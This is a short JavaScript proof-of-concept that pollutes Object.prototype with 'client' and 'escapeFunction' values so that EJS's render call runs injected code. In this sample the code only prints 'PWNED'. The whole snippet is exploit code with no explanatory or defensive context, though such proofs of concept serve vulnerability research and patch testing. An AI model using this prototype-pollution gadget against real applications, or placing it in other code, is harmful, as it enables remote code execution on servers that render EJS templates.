const ejs = require('ejs');

Object.prototype.client = 'true';
Object.prototype.escapeFunction = 'function() {console.log("PWNED")}';

const template = '<h2><%= name %></h2>';
ejs.render(template, {name: 'John'}, {});